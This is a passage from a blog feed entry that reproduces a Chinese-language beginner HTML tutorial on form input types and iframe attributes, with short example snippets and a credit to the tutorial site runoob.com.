<code>&lt;div&gt;</code> 和 <code>&lt;span&gt;</code> 元素。</li><li><code>&lt;span&gt;</code>通常被用来包裹文本或其他行内元素，比如用来设置特定文本的样式。</li></ul><h2 id="表单和输入"><a href="#表单和输入" class="headerlink" title="表单和输入"></a>表单和输入</h2><p>HTML 表单用于收集用户的输入信息。</p><p>表单元素是允许用户在表单中输入内容，比如：文本域（textarea）、下拉列表（select）、单选框（radio-buttons）、复选框（checkbox） 等等。</p><p>我们可以使用 <code>&lt;form&gt;</code> 标签来创建表单:</p><h3 id="HTML-表单-输入元素"><a href="#HTML-表单-输入元素" class="headerlink" title="HTML 表单 - 输入元素"></a>HTML 表单 - 输入元素</h3><p>多数情况下被用到的表单标签是输入标签 **<code>&lt;input&gt;</code>**。输入类型是由type属性定义。接下来我们介绍几种常用的输入类型。</p><h4 id="文本域"><a href="#文本域" class="headerlink" title="文本域"></a><strong>文本域</strong></h4><p>文本域通过 <strong><code>&lt;input type=&quot;text&quot;&gt;</code></strong> 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">First name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;firstname&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">Last name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lastname&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意:表单本身并不可见。同时，在大多数浏览器中，文本域的默认宽度是 20 个字符。</p><h4 id="密码字段"><a href="#密码字段" class="headerlink" title="密码字段"></a><strong>密码字段</strong></h4><p>密码字段通过标签 <code>&lt;input type=&quot;password&quot;&gt;</code> 来定义:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;pwd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong>密码字段字符不会明文显示，而是以星号 ***** 或圆点 <strong>.</strong> 替代。</p><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a><strong>单选按钮</strong></h4><p><strong><code>&lt;input type=&quot;radio&quot;&gt;</code></strong> 标签定义了表单的单选框选项:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a><strong>复选框</strong></h4><p><strong><code>&lt;input type=&quot;checkbox&quot;&gt;</code></strong> 定义了复选框。</p><p>复选框可以选取一个或多个选项：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;vehicle&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bike&quot;</span>&gt;</span>我喜欢自行车<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;vehicle&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Car&quot;</span>&gt;</span>我喜欢小汽车</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="提交按钮"><a href="#提交按钮" class="headerlink" title="提交按钮"></a><strong>提交按钮</strong></h4><p><strong><code>&lt;input type=&quot;submit&quot;&gt;</code></strong> 定义了提交按钮。</p><p>当用户单击确认按钮时，表单的内容会被传送到服务器。表单的动作属性 <strong>action</strong> 定义了服务端的文件名。<strong>action</strong> 属性会对接收到的用户输入数据进行相关的处理:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span> <span class="attr">action</span>=<span class="string">&quot;html_form_action.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line">Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p><strong>iframe语法:</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;URL&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该URL指向不同的网页。</p><h3 id="iframe-设置高度与宽度"><a href="#iframe-设置高度与宽度" class="headerlink" title="iframe - 设置高度与宽度"></a><strong>iframe - 设置高度与宽度</strong></h3><p>height 和 width 属性用来定义iframe标签的高度与宽度。</p><p>属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="iframe-移除边框"><a href="#iframe-移除边框" class="headerlink" title="iframe - 移除边框"></a><strong>iframe - 移除边框</strong></h3><p>frameborder 属性用于定义iframe表示是否显示边框。</p><p>设置属性值为 “0” 移除iframe的边框:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用-iframe-来显示目标链接页面"><a href="#使用-iframe-来显示目标链接页面" class="headerlink" title="使用 iframe 来显示目标链接页面"></a><strong>使用 iframe 来显示目标链接页面</strong></h3><p>iframe 可以显示一个目标链接的页面</p><p>目标链接的属性必须使用 iframe 的属性，如下实例:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">name</span>=<span class="string">&quot;iframe_a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://1.top&quot;</span> <span class="attr">target</span>=<span class="string">&quot;iframe_a&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span>HIJWEI.TOP<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="文章引用"><a href="#文章引用" class="headerlink" title="文章引用"></a><strong>文章引用</strong></h1><p>1.引用<strong>菜鸟教程</strong>的文章<br>    原文链接：<a href="https://www.runoob.com/html/html-tutorial.html">https://www.runoob.com/html/html-tutorial.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;HTML简介&quot;&gt;&lt;a href=&quot;#HTML简介&quot; class=&quot;headerlink&quot; title=&quot;HTML简介&quot;&gt;&lt;/a&gt;HTML简介&lt;/h2&gt;&lt;p&gt;HTML（&lt;strong&gt;H&lt;/strong&gt;yper&lt;strong&gt;T&lt;/strong&gt;ext &lt;stro</summary>
      
    
    
    
    <category term="开发" scheme="https://we11s.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="开发" scheme="https://we11s.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
</feed>
